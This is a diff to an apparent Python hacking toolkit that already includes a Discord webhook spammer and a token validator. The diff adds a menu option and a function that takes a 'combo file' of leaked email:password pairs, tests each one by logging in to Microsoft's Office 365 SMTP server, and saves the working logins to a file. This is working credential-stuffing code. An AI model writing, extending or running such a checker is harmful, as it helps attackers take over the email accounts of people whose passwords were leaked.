@@ -8,6 +8,7 @@ import requests
 import uuid
 import platform
 import hashlib
+import smtplib
 
 # Flag to control the animation loop
 animation_running = True
@@ -136,6 +137,45 @@ def spam_webhook(webhook_url, message, count):
             print(f"Failed to send message {i+1}/{count}")
         time.sleep(0.2)  # Adjust the delay between messages
 
+def check_hotmail_outlook_accounts(input_file_path):
+    # Define the output file path
+    output_file_path = "active_hotmails.txt"
+
+    # Read the input file with utf-8 encoding
+    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
+        lines = file.readlines()
+
+    # Set to track valid accounts
+    valid_accounts = []
+
+    # Check each email:password pair
+    for line in lines:
+        line = line.strip()
+        if ':' not in line:
+            print(f"Skipping invalid line: {line}")
+            continue  # Skip malformed lines
+
+        email, password = line.split(':', 1)  # Ensure only one split
+        try:
+            # Connect to the Hotmail/Outlook SMTP server
+            smtp_server = smtplib.SMTP('smtp.office365.com', 587)
+            smtp_server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
+            smtp_server.login(email, password)
+            smtp_server.quit()
+            valid_accounts.append(f"{email}:{password}")
+            print(f"Valid: {email}")
+        except Exception as e:
+            print(f"Invalid: {email}")
+
+    # Save valid accounts to the output file
+    with open(output_file_path, 'w', encoding='utf-8') as output_file:
+        for account in valid_accounts:
+            output_file.write(account + "\n")
+
+    print(f"Valid accounts saved to {output_file_path}")
+    time.sleep(0.5)
+    os.system("cls")
+
 def main():
     global animation_running
 
@@ -167,9 +207,10 @@ def main():
         print(f"{PURPLE}1. Process File{RESET}")
         print(f"{BLUE}2. Spam Webhook{RESET}")
         print(f"{PURPLE}3. Validate Discord Token{RESET}")
-        print(f"{BLUE}4. Exit{RESET}")
+        print(f"{BLUE}4. Check Hotmail/Outlook Accounts{RESET}")
+        print(f"{PURPLE}5. Exit{RESET}")
 
-        choice = input(f"{PURPLE}Please choose an option (1, 2, 3, or 4): {RESET}")
+        choice = input(f"{PURPLE}Please choose an option (1, 2, 3, 4, or 5): {RESET}")
 
         if choice == '1':
             # Predefined input file path and output folder
@@ -202,6 +243,9 @@ def main():
             time.sleep(2)
             os.system("cls")
         elif choice == '4':
+            input_file_path = input("Enter the path to the combo file: ")
+            check_hotmail_outlook_accounts(input_file_path)
+        elif choice == '5':
             print("Exiting the program.")
             break
         else:
